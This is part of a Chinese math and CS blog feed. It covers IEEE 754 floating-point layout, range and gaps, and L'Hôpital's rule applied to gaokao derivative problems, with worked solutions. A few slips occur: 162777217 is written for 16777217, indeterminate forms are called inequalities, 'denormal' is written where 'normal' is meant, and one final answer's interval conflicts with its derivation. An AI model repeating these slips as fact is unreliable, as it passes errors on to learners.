<p>$$
V = (-1)^s \cdot M \cdot 2^E
$$</p>
<p>其中，$s$ 是<strong>符号位</strong>，$M$ 是有效数字（$1 \le M &lt; 2$），$E$ 是指数。</p>
<p>举个例子，对于十进制小数 $0.15625$，其二进制表示为 $0.00101$，用二进制下的科学记数法表示就是 $0.00101 = 1.01 \times 2^{-3}$，那么其符号位为 $0$，有效数字为 $1.01$，尾码为 $.01$，指数为 $-3$。</p>
<p>我们很容易发现，$M$ 的整数部分一定恒为 $1$，那还存什么存？只用存 $M$ 的小数部分就行了，所以<strong>尾码</strong>就是 $M - 1$。</p>
<h2 id="指数偏移值">指数偏移值</h2>
<p>依据前文对阶码存储结构的介绍，<strong>阶码</strong>看起来就像是一个无符号整数。可惜科学记数法中指数是可以为负数的。怎么办？IEEE 就搞了个 <em>指数偏移值 (exponent bias)</em> 出来。指数偏移值就是指<strong>浮点数表示法中的指数域的编码值（即阶码的值）为指数的实际值加上某个固定的值</strong>（阶码 = $E$ + 指数偏移值）。在 IEEE 754 标准中，指数偏移值的固定大小为 $2^{e - 1} - 1$，其中 $e$ 为储存指数的比特长度。</p>
<p>例如，在单精度中，阶码位长 $e$ 为 8 bit，换算成十进制其可表示范围为 $0 \sim 255$。依据前文，其指数偏移值是 $2^{8 - 1} - 1 = 127$。这样一来，对于单精度浮点数类型指数就可取 $-127 \sim 128$ 了。</p>
<h2 id="规约形式与非规约形式">规约形式与非规约形式</h2>
<h3 id="规约形式-normalized-numbers">规约形式 (Normalized numbers)</h3>
<p><strong>规约形式的浮点数</strong>指的是<strong>阶码</strong>范围为 $(0, 2^{e} - 1)$ ，且<strong>尾码</strong>部分最高有效位（即整数部分）为 $1$ 的浮点数。也就是说，前文中我们讨论的浮点数都是规约形式的。</p>
<h3 id="非规约形式-denormalized-numbers">非规约形式 (Denormalized numbers)</h3>
<p>为了减小因为<em>下溢 (underflow)</em> 造成的精度损失（换言之，为了使得浮点数可表示的正最小值和负最大值更接近 $0$），IEEE 754 标准中提出了非规约形式浮点数——用于填补最小正数和最大负数与 $0$ 的距离。</p>
<p><strong>非规约形式浮点数</strong>的<strong>阶码</strong>为 $0$，并且<strong>尾码</strong>为非 $0$。相比规约形式浮点数其最大的不同之处在于，<strong>其尾码隐含的整数部分不再是 $1$，而变成了 $0$</strong>。另外，IEEE 754 标准规定，<strong>非规约形式的浮点数的指数偏移值比规约形式的浮点数的指数偏移值小 $1$</strong>。也就是说，最小的规约形式浮点数阶码为 $1$，指数的实际值为 $-126$。而非规约形式的单精度浮点数的阶码为 $0$，依照上述规定其指数的实际值也是 $-126$ 而不是 $-127$。</p>
<h4 id="为什么要这样规定">为什么要这样规定？</h4>
<p>我们首先来看看这种规定下<strong>非规约形式</strong>浮点数能表示的<strong>最大</strong>正浮点数吧（拿<strong>单精度</strong>举个例子，双精度是类似的）：</p>
<table>
<thead>
<tr>
<th>符号位</th>
<th>阶码</th>
<th>尾码</th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td>0000 0000</td>
<td>111 1111 1111 1111 1111 1111</td>
</tr>
</tbody>
</table>
<p>不难得出，其实际指数 $E = 0 - 126 = -126$，其实际有效数字为 ${0.11111111111111111111111}_2$。因此，二进制下，其表示的实际值为 $V = {0.11111111111111111111111}_2 \times 2^{-126}$。</p>
<p>而对于<strong>规约形式浮点数</strong>能表示的<strong>最小</strong>正浮点数：</p>
<table>
<thead>
<tr>
<th>符号位</th>
<th>阶码</th>
<th>尾码</th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td>0000 0001</td>
<td>000 0000 0000 0000 0000 0000</td>
</tr>
</tbody>
</table>
<p>不难得出，其实际指数为 $E = 1 - 127 = -126$，其实际有效数字为 ${1.00000000000000000000000}_2$。因此，二进制下，其表示的实际值为 $V = {1.00000000000000000000000}_2 \times 2^{-126}$。</p>
<p>不难发现在这种规定下，<strong>最大非规约形式浮点数和最小非规约形式浮点数是连续的</strong>。这也是该规定出现的原因。</p>
<h2 id="特殊值">特殊值</h2>
<p>另外，在标准中也定义了几个特殊值：</p>
<ul>
<li>当<strong>阶码</strong>和<strong>尾码</strong>均为 $0$ 时，浮点数表示的实际值为 $\pm 0$；</li>
<li>当<strong>阶码</strong>为 $2^{e} - 1$且<strong>尾码</strong>为 0 时，浮点数表示的实际值为 $\pm \infty$；</li>
<li>当<strong>阶码</strong>为 $2^e - 1$ 且<strong>尾码</strong>非 0 时，浮点数表示的实际值为 $\text{NaN}$ <em>(Not a Number)</em>。</li>
</ul>
<p>$\text{NaN}$ 是什么？可以吃吗？</p>
<p>当然不能。$\text{NaN}$ 往往出现于一些无效的计算结果。比如说，对负数进行求平方根运算，返回的结果就是 $\text{NaN}$。</p>
<h2 id="取值范围精度和间隙">取值范围、精度和间隙</h2>
<p>注：本节主要讨论单精度浮点数的取值范围与精度。双精度与之类似，所以请读者自行推导。</p>
<h3 id="取值范围-range">取值范围 (Range)</h3>
<p>前文中已经介绍过单精度浮点数在存储中的大致结构了。我们先就<strong>正浮点数</strong>做一下分析：</p>
<h4 id="非规约形式单精度浮点数能表示的最小正值">非规约形式单精度浮点数能表示的最小正值</h4>
<table>
<thead>
<tr>
<th>符号位</th>
<th>阶码</th>
<th>尾码</th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td>0000 0000</td>
<td>000 0000 0000 0000 0000 0001</td>
</tr>
</tbody>
</table>
<p>不难得出，不难得出，其实际指数 $E$ = 0 - 126 = -126，其实际有效数字为 ${0.00000000000000000000001}_2$。因此，二进制下，其表示的实际值为 $V = {0.00000000000000000000001}_2 \times 2^{-126} \approx 1.40130 \times 10^{-45}$。</p>
<h4 id="规约形式单精度浮点数能表示的最小正值">规约形式单精度浮点数能表示的最小正值</h4>
<table>
<thead>
<tr>
<th>符号位</th>
<th>阶码</th>
<th>尾码</th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td>0000 0001</td>
<td>000 0000 0000 0000 0000 0000</td>
</tr>
</tbody>
</table>
<p>不难得出，其实际指数为 $E$ = 1 - 127 = -126，其实际有效数字为 ${1.00000000000000000000000}_2$。因此，二进制下，其表示的实际值为 $V = {1.00000000000000000000000}_2 \times 2^{-126} \approx 1.17549 \times 10^{-38}$。</p>
<h5 id="单精度浮点数能表示的最大正值">单精度浮点数能表示的最大正值</h5>
<table>
<thead>
<tr>
<th>符号位</th>
<th>阶码</th>
<th>尾码</th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td>1111 1110</td>
<td>111 1111 1111 1111 1111 1111</td>
</tr>
</tbody>
</table>
<p>不难得出，不难得出，其实际指数 $E$ = 254 - 127 = 127，其实际有效数字为 ${1.11111111111111111111111}_2$。因此，二进制下，其表示的实际值为 $V = {1.11111111111111111111111}_2 \times 2^{127} \approx 3.40282 \times 10^{38}$。</p>
<p>对于负数也是一样的，这里也不做过多讨论。</p>
<p>双精度也是与此类似的，这里只给出如下结论：</p>
<h5 id="非规约形式双精度浮点数能表示的最小正值">非规约形式双精度浮点数能表示的最小正值</h5>
<p>$2^{-1074} \approx 4.94066 \times 10^{-324}$</p>
<h5 id="规约形式双精度浮点数能表示的最小正值">规约形式双精度浮点数能表示的最小正值</h5>
<p>$2^{-1022} \approx 2.22507 \times 10^{-308}$</p>
<h5 id="双精度浮点数能表示的最大正值">双精度浮点数能表示的最大正值</h5>
<p>$(1 - 2^{-53}) \times 2^{1024} \approx 1.79769 \times 10^{308}$</p>
<h3 id="精度-precision-与-间隙-gap">精度 (Precision) 与 间隙 (Gap)</h3>
<p>首先摘抄一段来自 <a href="https://en.wikipedia.org/wiki/IEEE_754-1985#Range_and_precision">Wikipedia</a> 的原文：</p>
<blockquote>
<p><strong>Precision</strong> is defined as the minimum difference between two successive mantissa representations; thus it is a function only in the mantissa; while the <strong>gap</strong> is defined as the difference between two successive numbers.</p>
</blockquote>
<p>简单翻译过来就是（不知道翻译错没有）：</p>
<p><strong>精度</strong>的定义为两个连续尾数表示之间的最小差值，因此它只是存在于尾数中的功能。而<strong>间隙</strong>被定义为两个连续数字之间的差值。</p>
<p>对于<strong>精度</strong>，我们已经可以很容易地回答这个问题了。对于单精度浮点数，尾码有 $23$ 位。$2^{23} = 8388608$，因此<strong>单精度浮点数最长（不完整地）可存储小数点后 $7$ 位，但只能完整地存储小数点后 $6$ 位</strong>。</p>
<p>而对于<strong>间隙</strong>出现的原因，我们可以这样理解。</p>
<p>前面我们提到了浮点数内部存储实际上是二进制科学记数法，我们不难发现尾数是有限位的。当指数越来越大时，相邻两尾数表示的两实际值之间的大小也越来越大。这两实际值之间的差也就是<strong>间隙</strong>。而在间隙之间的数是无法被准确存储下来的。</p>
<p>我们不妨从 <a href="https://en.wikipedia.org/wiki/IEEE_754-1985#Single_precision">Wikipedia</a> 摘录一个展示单精度类型在不同指数下相邻两实际值之间的间隙大小的表格。其中最小值和最大值分别代表当实际指数一定时该浮点数可表示的最小十进制数和最大十进制数。</p>
<table>
<thead>
<tr>
<th><strong>实际指数</strong></th>
<th><strong>阶码</strong></th>
<th><strong>最小值</strong></th>
<th><strong>最大值</strong></th>
<th><strong>间隙</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td>127</td>
<td>1</td>
<td>≈ 1.999999880791</td>
<td>≈ 1.19209e-7</td>
</tr>
<tr>
<td>1</td>
<td>128</td>
<td>2</td>
<td>≈ 3.999999761581</td>
<td>≈ 2.38419e-7</td>
</tr>
<tr>
<td>2</td>
<td>129</td>
<td>4</td>
<td>≈ 7.999999523163</td>
<td>≈ 4.76837e-7</td>
</tr>
<tr>
<td>10</td>
<td>137</td>
<td>1024</td>
<td>≈ 2047.999877930</td>
<td>≈ 1.22070e-4</td>
</tr>
<tr>
<td>11</td>
<td>138</td>
<td>2048</td>
<td>≈ 4095.999755859</td>
<td>≈ 2.44141e-4</td>
</tr>
<tr>
<td>23</td>
<td>150</td>
<td>8388608</td>
<td>16777215</td>
<td>1</td>
</tr>
<tr>
<td>24</td>
<td>151</td>
<td>16777216</td>
<td>33554430</td>
<td>2</td>
</tr>
<tr>
<td>127</td>
<td>254</td>
<td>≈ 1.70141e38</td>
<td>≈ 3.40282e38</td>
<td>≈ 2.02824e31</td>
</tr>
</tbody>
</table>
<p>根据表格，当实际指数为 24 时，相邻两数间的差值已经达到了 2 这么大。因此，$162777217$ 实际上是无法用浮点数表示的，因为事实上它的值会丢失精度至 $162777216$。</p>
<p>相比单精度，由于双精度的尾数总位数更长，故在指数相同时，双精度数与数之间的间隙会比单精度数更小。下面我们也继续从 <a href="https://en.wikipedia.org/wiki/IEEE_754-1985#Double_precision">Wikipedia</a> 摘录一个展示双精度类型不同指数下相邻两实际值间间隙的表格：</p>
<table>
<thead>
<tr>
<th><strong>实际指数</strong></th>
<th><strong>阶码</strong></th>
<th><strong>最小值</strong></th>
<th><strong>最大值</strong></th>
<th><strong>间隙</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td>1023</td>
<td>1</td>
<td>≈ 1.999999999999999777955</td>
<td>≈ 2.22045e-16</td>
</tr>
<tr>
<td>1</td>
<td>1024</td>
<td>2</td>
<td>≈ 3.999999999999999555911</td>
<td>≈ 4.44089e-16</td>
</tr>
<tr>
<td>2</td>
<td>1025</td>
<td>4</td>
<td>≈ 7.999999999999999111822</td>
<td>≈ 8.88178e-16</td>
</tr>
<tr>
<td>10</td>
<td>1033</td>
<td>1024</td>
<td>≈ 2047.999999999999772626</td>
<td>≈ 2.27374e-13</td>
</tr>
<tr>
<td>11</td>
<td>1034</td>
<td>2048</td>
<td>≈ 4095.999999999999545253</td>
<td>≈ 4.54747e-13</td>
</tr>
<tr>
<td>52</td>
<td>1075</td>
<td>4503599627370496</td>
<td>9007199254740991</td>
<td>1</td>
</tr>
<tr>
<td>53</td>
<td>1076</td>
<td>9007199254740992</td>
<td>18014398509481982</td>
<td>2</td>
</tr>
<tr>
<td>1023</td>
<td>2046</td>
<td>≈ 8.98847e307</td>
<td>≈ 1.79769e308</td>
<td>≈ 1.99584e292</td>
</tr>
</tbody>
</table>
<p>这也完美地解释了前几天在学校的 OJ 上水题有的题明明在单精度取值范围内却没法用单精度 A 掉的原因…… 看起来还是我太弱了 orz。</p>
<h1 id="小结">小结</h1>
<p>懒得写了（逃</p>
<h1 id="参考文献">参考文献</h1>
<p>排序顺序嘛…… 我才不会告诉你是乱序呢。</p>
<ul>
<li>红太阳 <a href="http://fstqwq.pw">fstqwq</a> %%%</li>
<li>维基百科 - <a href="https://zh.wikipedia.org/zh-cn/%E4%BA%8C%E8%A3%9C%E6%95%B8">补码</a></li>
<li>维基百科 - <a href="https://zh.wikipedia.org/wiki/IEEE_754">IEEE 754</a></li>
<li>Wikipedia - <a href="https://en.wikipedia.org/wiki/IEEE_754-1985">IEEE 754-1985</a></li>
<li>adream307 - <a href="http://blog.csdn.net/adream307/article/details/7246993">float 的内存结构</a></li>
<li>andyhzw - <a href="http://blog.chinaunix.net/uid-28458801-id-3507427.html">C/C++ 中浮点数的存储方式</a></li>
<li>wenrang - <a href="http://blog.csdn.net/wenrang/article/details/5758759">浮点数与 IEEE 浮点标准</a></li>
</ul>
]]></content>
		</item>
		
		<item>
			<title>高考导数: 洛必达法则</title>
			<link>https://codgician.me/zh-hans/posts/2017/04/thoughts-on-senior-3-derivative-problems-3/</link>
			<pubDate>Sat, 08 Apr 2017 20:26:59 +0800</pubDate>
			
			<guid>https://codgician.me/zh-hans/posts/2017/04/thoughts-on-senior-3-derivative-problems-3/</guid>
			<description>简介 法则内容 例题赏析 小结 参考文献 简介 分离参数可谓是解决高考导数题目中极为常见的一种基本方法，但很多时候我们却会遇到端点处取值没有意义的情况。</description>
			<content type="html"><![CDATA[
<script src="/rmarkdown-libs/header-attrs/header-attrs.js"></script>

<div id="TOC">
<ul>
<li><a href="#简介">简介</a></li>
<li><a href="#法则内容">法则内容</a></li>
<li><a href="#例题赏析">例题赏析</a></li>
<li><a href="#小结">小结</a></li>
<li><a href="#参考文献">参考文献</a></li>
</ul>
</div>

<div id="简介" class="section level1">
<h1>简介</h1>
<p>分离参数可谓是解决高考导数题目中极为常见的一种基本方法，但很多时候我们却会遇到端点处取值没有意义的情况。这时，我们就需要借助洛必达法则这一高等数学中极为重要的法则来解决问题了。</p>
<p>在介绍洛必达（伯努利）法则之前，先声明一下我<strong>非常不建议大家在正式考试的解答题中优先使用该法则</strong>。这个法则事实上是高等数学中的知识，因此在高考或其它正式考试中使用<strong>极可能造成失分</strong>。所以<strong>除非万不得已，请不要用这个方法。</strong></p>
</div>
<div id="法则内容" class="section level1">
<h1>法则内容</h1>
<p>首先我们来看看洛必达法则是个什么东西（以下内容摘自百科）：</p>
<p><strong>(1) <span class="math inline">\(\frac{0}{0}\)</span> 型不等式极限</strong>：</p>
<p>若函数 <span class="math inline">\(f(x)\)</span> 满足下列条件：</p>
<ol style="list-style-type: decimal">
<li><span class="math inline">\(\lim\limits_{x \to a}f(x) = 0, \ \lim\limits_{x \to a}g(x) = 0\)</span>；</li>
<li>在 <span class="math inline">\(a\)</span> 点的某去心领域内两者都可导，且 <span class="math inline">\(g&#39;(x) \neq 0\)</span>；（去心领域可以理解为接近 <span class="math inline">\(a\)</span> 但不包含 <span class="math inline">\(a\)</span> 的区间）</li>
<li><span class="math inline">\(\lim\limits_{x \to a} \frac{f&#39;(x)}{g&#39;(x)} = A\)</span>；（暗示若一阶导无法求极限还可以求二阶导乃至更高阶导）</li>
</ol>
<p>则有：</p>
<p><span class="math display">\[
\lim\limits_{x \to a} \frac{f(x)}{g(x)} = \lim\limits_{x \to a} \frac{f&#39;(x)}{g&#39;(x)} = A
\]</span></p>
<p><strong>(2) <span class="math inline">\(\frac{\infty}{\infty}\)</span>型不等式极限</strong>：</p>
<p>若函数 <span class="math inline">\(f(x)\)</span> 满足下列条件：</p>
<ol style="list-style-type: decimal">
<li><span class="math inline">\(\lim\limits_{x \to a}f(x) = \infty, \ \lim\limits_{x \to a}g(x) = \infty\)</span>；</li>
<li>在 <span class="math inline">\(a\)</span> 点的某去心领域内两者都可导，且 <span class="math inline">\(g&#39;(x) \neq 0\)</span>；（去心领域可以理解为接近 <span class="math inline">\(a\)</span> 但不包含 <span class="math inline">\(a\)</span> 的区间）</li>
<li><span class="math inline">\(\lim\limits_{x \to a} \frac{f&#39;(x)}{g&#39;(x)} = A\)</span>；（暗示若一阶导无法求极限还可以求二阶导乃至更高阶导）</li>
</ol>
<p>则有：</p>
<p><span class="math display">\[
\lim\limits_{x \to a} \frac{f(x)}{g(x)} = \lim\limits_{x \to a} \frac{f&#39;(x)}{g&#39;(x)} = A
\]</span></p>
<p>你可能会说这玩意儿有什么卵用：好，请你仔细回忆，当你使用<strong>分离参数法</strong>解题时有没有遇到过一种极其坑爹的情况：好不容易判断出 <span class="math inline">\(f(x)\)</span> 在给定区间上的单调性，然而特么的 <span class="math inline">\(f(x)\)</span> 在端点处的取值竟然没意义，那我还证个卵啊！洛必达法则正是适用于这一种情况，它可以让你找到这种情况下函数在端点处的趋近值（极限值）。</p>
<p>另外，对于除上两种外其他类型的不等式可通过使用一定的技巧化为上述两种，为了节省篇幅我就不在这里赘述了，感兴趣的话可以到<a href="https://zh.wikipedia.org/wiki/%E6%B4%9B%E5%BF%85%E8%BE%BE%E6%B3%95%E5%88%99">维基百科</a>上看看。</p>
<p>至于对该法则的证明，去查了一下貌似要用柯西中值定理什么的，懵逼 =.=||…</p>
</div>
<div id="例题赏析" class="section level1">
<h1>例题赏析</h1>
<p>下面我们分别演示使用洛必达法则来解答上文中2010和2011年的那两道导数题。</p>
<p><strong>1.</strong> (2010.全国大纲卷理) 设函数<span class="math inline">\(f(x) = 1 - e^{-x}\)</span>.<br />
(1) 证明：当 <span class="math inline">\(x &gt; -1\)</span> 时，<span class="math inline">\(f(x) \ge \frac{x}{x+1}\)</span>；<br />
(2) 设当 <span class="math inline">\(x \ge 0\)</span> 时，<span class="math inline">\(f(x) \le \frac{x}{ax + 1}\)</span>，求 <span class="math inline">\(a\)</span> 的取值范围.</p>
<p><em>注：由于 (1) 问较简单，这里只分析第 (2) 问</em>。</p>
<p><strong>解:</strong> (2)<br />
<strong>I.</strong> 若 <span class="math inline">\(a &lt; 0\)</span><br />
<span class="math inline">\(\therefore\)</span> 当 <span class="math inline">\(x \in (-\frac{1}{a},+\infty)\)</span> 时：</p>
<p><span class="math display">\[
\frac{x}{ax + 1} &lt; 0
\]</span></p>
<p>又 <span class="math inline">\(\because\)</span> 在 <span class="math inline">\(x \in [0,+\infty)\)</span> 时：</p>
<p><span class="math display">\[
f(x) = 1 - e^{-x} \ge 0
\]</span></p>
<p><span class="math inline">\(\therefore\)</span> 当 <span class="math inline">\(x \in (-\frac{1}{a},+\infty)\)</span> 时：</p>
<p><span class="math display">\[
f(x) &gt; \frac{x}{ax + 1}
\]</span></p>
<p>与题意矛盾，舍去。</p>
<p><strong>II.</strong> 若 <span class="math inline">\(a \ge 0\)</span></p>
<p><span class="math display">\[
\begin{aligned}
&amp; f(x) \le \frac{x}{ax + 1} \\
&amp; \Leftrightarrow 1 - e^{-x} \le \frac{x}{ax + 1} \\
&amp; \Leftrightarrow a \le \frac{xe^x - e^x + 1}{xe^x - x}
\end{aligned}
\]</span></p>
<p>令：</p>
<p><span class="math display">\[
g(x) = \frac{xe^x - e^x + 1}{xe^x - x}
\]</span></p>
<p><span class="math display">\[
\begin{aligned}
\therefore g&#39;(x) &amp; = \frac{e^{2x} - x^2e^x - 2e^x + 1}{(xe^x - x)^2} \\
                 &amp; = \frac{e^x}{(xe^x - x)^2}(e^x - x^2 - 2 - e^{-x})
\end{aligned}
\]</span></p>
<p>令：</p>
<p><span class="math display">\[
h(x) = e^x - x^2 - 2 - e^{-x}
\]</span></p>
<p><span class="math display">\[
\therefore h&#39;(x) = e^x - 2x - e^{-x}
\]</span></p>
<p><span class="math display">\[
\therefore h&#39;&#39;(x) = e^x + e^{-x} - 2 &gt; 0
\]</span></p>
<p><span class="math inline">\(\therefore h&#39;(x)\)</span> 在 <span class="math inline">\([0,+\infty)\)</span> 单调递增，<span class="math inline">\(h&#39;(x) \ge h&#39;(0) = 0\)</span><br />
<span class="math inline">\(\therefore h(x)\)</span> 在 <span class="math inline">\([0,+\infty)\)</span> 单调递增，<span class="math inline">\(h(x) \ge h(0) = 0\)</span><br />
<span class="math inline">\(\therefore g&#39;(x) \ge 0\)</span>，<span class="math inline">\(g(x)\)</span> 在 <span class="math inline">\([0,+\infty)\)</span> 单调递增</p>
<p><em>插一句话：好的，现在我们发现 <span class="math inline">\(g(x)\)</span> 在 <span class="math inline">\([0,+\infty)\)</span> 单调递增，可是 <span class="math inline">\(g(0)\)</span> 是没有意义的！这下子只好用洛必达法则了</em>。</p>
<p>由洛必达法则有：</p>
<p><span class="math display">\[
\begin{aligned}
\lim\limits_{x \to 0}g(x)
&amp; = \lim\limits_{x \to 0}\frac{xe^x - e^x + 1}{xe^x - x}  \\
&amp; = \lim\limits_{x \to 0}\frac{xe^x}{e^x + xe^x - 1} \\
&amp; = \lim\limits_{x \to 0}\frac{e^x + xe^x }{2e^x + xe^x} \\
&amp; = \frac{1}{2}
\end{aligned}
\]</span></p>
<p><span class="math inline">\(\therefore g(x) \ge \frac{1}{2}\)</span><br />
<span class="math inline">\(\therefore a \le \frac{1}{2}\)</span></p>
<p>答：<span class="math inline">\(a\)</span> 的取值范围为 <span class="math inline">\([0,\frac{1}{2}]\)</span>。</p>
<p>虽然看上去篇幅略小，其实你仔细观察过程后就会发现求了很多次导，运算量着实不小，其实并没有第一节中提到的简化原函数的方法容易。但至少，分离参数法作为一种极为常见的思路是很容易想到的，故该方法也远比<a href="http://www.jyeoo.com/math2/ques/detail/3e6ca929-5ca7-4716-a80c-1873e641d558">参考答案</a>简单。</p>
<hr />
<p><strong>2.</strong> (2011.全国大纲卷理) 已知函数 <span class="math inline">\(f(x) = \frac{alnx}{x+1} + \frac{b}{x}\)</span>，曲线 <span class="math inline">\(y = f(x)\)</span> 在点 <span class="math inline">\((1, f(1))\)</span> 处的切线方程为<span class="math inline">\(x + 2y - 3 = 0\)</span>.<br />
(1) 求a,b的值;<br />
(2) 如果当<span class="math inline">\(x &gt; 0\)</span>，且 <span class="math inline">\(x \neq 0\)</span> 时，<span class="math inline">\(f(x) &gt; \frac{lnx}{x - 1} + \frac{k}{x}\)</span>，求 <span class="math inline">\(k\)</span> 的取值范围.</p>
<p><em>注：(1) 问过程略，解得 a = 1，b = 1，这里只分析第 (2) 问</em>。</p>
<p><strong>解:</strong> (2)<br />
由题，有：</p>
<p><span class="math display">\[
\frac{lnx}{x + 1} + \frac{1}{x} &gt; \frac{lnx}{x - 1} + \frac{k}{x}
\]</span></p>
<p>即：</p>
<p><span class="math display">\[
k &lt; \frac{xlnx}{x + 1} + \frac{1}{x} - \frac{xlnx}{x - 1} = \frac{2xlnx}{1 - x^2} + 1
\]</span></p>
<p>令：</p>
<p><span class="math display">\[
g(x) = \frac{2xlnx}{1 - x^2} + 1 \ (x &gt; 0, x \neq 1)
\]</span></p>
<p><span class="math display">\[
\therefore g&#39;(x) = \frac{2(x^2 + 1)lnx + 2(1 - x^2)}{(1 - x^2)^2} = \frac{2(x^2 + 1)}{(1 - x^2)^2}(lnx + \frac{1 - x^2}{x^2 + 1})
\]</span></p>
<p>令：</p>
<p><span class="math display">\[
h(x) = lnx + \frac{1 - x^2}{x^2 + 1}
\]</span></p>
<p><span class="math display">\[
\therefore h&#39;(x) = \frac{1}{x} + \frac{-4x}{(1 + x^2)^2} = \frac{(1 - x^2)^2}{x(1 + x^2)^2} &gt; 0
\]</span></p>
<p><span class="math inline">\(\therefore h(x)\)</span> 在 <span class="math inline">\((0,+\infty)\)</span> 上单调递增，且 <span class="math inline">\(h(1) = 0\)</span><br />
<span class="math inline">\(\therefore x \in (0,1)\)</span> 时，<span class="math inline">\(h(x) &lt; 0\)</span>；<span class="math inline">\(x \in (1,+\infty)\)</span> 时，<span class="math inline">\(h(x) &gt; 0\)</span><br />
<span class="math inline">\(\therefore x \in (0,1)\)</span> 时，<span class="math inline">\(g&#39;(x) &lt; 0\)</span>，<span class="math inline">\(g(x)\)</span> 单调递减；<span class="math inline">\(x \in (1,+\infty)\)</span> 时，<span class="math inline">\(g&#39;(x) &gt; 0\)</span>，<span class="math inline">\(g(x)\)</span> 单调递增</p>
<p>由洛必达法则有:</p>
<p><span class="math display">\[
\begin{aligned}
\lim\limits_{x \to 1}g(x) &amp; = \lim\limits_{x \to 1}(\frac{2xlnx}{1 - x^2} + 1) \\
&amp; = 1 + \lim\limits_{x \to 1}\frac{2xlnx}{1 - x^2} \\
&amp; = 1 +  \lim\limits_{x \to 1}\frac{2lnx + 2}{-2x} \\
&amp; = 0
\end{aligned}
\]</span></p>
<p><span class="math inline">\(\therefore x \to 1\)</span> 时，<span class="math inline">\(g(x) = 0\)</span>，故在 <span class="math inline">\((0,1)\)</span> 和 <span class="math inline">\((1,+\infty)\)</span> 上恒有<span class="math inline">\(g(x) &gt; 0\)</span><br />
<span class="math inline">\(\therefore k \in (-\infty,0)\)</span></p>
<p>答: <span class="math inline">\(k\)</span> 的取值范围为 <span class="math inline">\((-\infty,0]\)</span>。</p>
</div>
<div id="小结" class="section level1">
<h1>小结</h1>
<p>洛必达法则告诉我们，对于恒成立问题，使用<strong>分离参数法</strong>是一定可以硬算出来的（虽然有时会多次求导，十分麻烦）。也正是因为如此，我并不推荐<strong>在高中阶段</strong>使用这种方法。除去这本身并不是高中生所应掌握的内容（这也是为什么在较正式的考试使用该方法极可能会被扣上几分），更重要的是一味地依赖于该方法会极大地限制我们的思路。</p>
<p>相信在初中学过数学竞赛的朋友们进入高中后都会发现，在高中阶段学的知识可以帮助我们轻而易举地解答许多数学联赛中的难题。比如，对于部分要求角度的几何题，我干嘛还要费尽心思看看哪里能做辅助线？直接用向量、正余玄定理、乃至三角函数恒等变换就可以轻松解决。然而，如果我们在初中阶段就这么做，纵使能够成功解题，但我们却没有使我们的转化思想等能力得到锻炼。就像我在前言中所说的一样，若干年后我们很可能并不会从事数学相关的行业，而什么正余玄定理之类的定理也很可能被我们逐步遗忘，但那种乐于探究的精神和转换思想作为一种习惯将会长存于我们心中，成为我们性格的一部分。这样，我理解中的数学教育初衷也就达到了。</p>
</div>
<div id="参考文献" class="section level1">
<h1>参考文献</h1>
<ul>
<li>陈柞同主编.创知路高考数学解题手册 立体几何·解析几何·导数·定积分 [M].北京, 2017</li>
<li>蔡小雄主编.更高更妙的高中数学 一题多解与一题多变 [M].浙江：浙江大学出版社, 2016</li>
</ul>
</div>
]]></content>
		</item>
		
		<item>
			<title>高考导数: 优化函数以方便求解</title>
			<link>https://codgician.me/zh-hans/posts/2017/04/thoughts-on-senior-3-derivative-problems-2/</link>
			<pubDate>Sat, 08 Apr 2017 20:21:50 +0800</pubDate>
			
			<guid>https://codgician.me/zh-hans/posts/2017/04/thoughts-on-senior-3-derivative-problems-2/</guid>
			<description>简介 真·简介 指数型 (\(e^x\)) 对数型 (\(\ln x\)) 既有对数又有指数？ 小结 参考文献 简介 在进入正题前总是忍不住想先扯点其它的…… 前几周经不住诱惑购入了蔡小雄先生所著</description>
			<content type="html"><![CDATA[
<script src="/rmarkdown-libs/header-attrs/header-attrs.js"></script>

<div id="TOC">
<ul>
<li><a href="#简介">简介</a></li>
<li><a href="#真简介">真·简介</a></li>
<li><a href="#指数型-ex">指数型 (<span class="math inline">\(e^x\)</span>)</a></li>
<li><a href="#对数型-ln-x">对数型 (<span class="math inline">\(\ln x\)</span>)</a></li>
<li><a href="#既有对数又有指数">既有对数又有指数？</a></li>
<li><a href="#小结">小结</a></li>
<li><a href="#参考文献">参考文献</a></li>
</ul>
</div>

<div id="简介" class="section level1">
<h1>简介</h1>
<p>在进入正题前总是忍不住想先扯点其它的……</p>
<p>前几周经不住诱惑购入了蔡小雄先生所著的数本高中数学相关的书籍，其中《更高更妙的高中数学 一题多解与一题多变》卷首语中的一段文字让我感触颇多：</p>
<blockquote>
<p>在实际教学中，我们会遇到这样的情况：有的题不是考察学生<strong>认知障碍</strong>，而是考查学生的“合理”错误；有的题不是让学生<strong>把握数学的本质、方法、思想和理性精神</strong>，而是教学生去防陷阱、防小人、防“边界”；有的题不是教学生<strong>大胆地去创新、探究</strong>，而是引导学生去“循规蹈矩”，找题型、找原型、找关系、找技巧。这样的题做多了，<strong>人会变笨，会更讨厌数学</strong>。</p>
</blockquote>
<p>而我个人的经历有何尝不与之相似？在高三上期与《高考数学你真的掌握了吗？》系列丛书邂逅前，我也因“循规蹈矩”而迷失于题海之中。在我眼中，有的只是繁琐的计算，枯燥的数字和无法捉摸的套路。当你秉承“暴力解决一切”的思想去面对数学时，数学诸多优美之处便荡然无存。</p>
<p>近几年来我们可以看到高考也越来越侧重于考察素质与能力：其不仅仅包含着对基本知识的概念与理解，更有一种<strong>乐于探究，勇于创新的精神</strong>。这种精神驱动着我们不仅仅满足于解出一道题，而是从不同的角度去思考，用不同的方法去探究，以在快乐与满足之中提升我们<strong>类比迁移、化繁为简、数形结合、归纳猜想等等数学素养</strong>。或许若干年后我们并不从事数学相关的职业，也早已忘记什么韦达定理、什么圆锥曲线第二定义… 但长存于心的一定将是迁移问题的思想和解决问题的能力。而有这，我想数学教育也就成功了。</p>
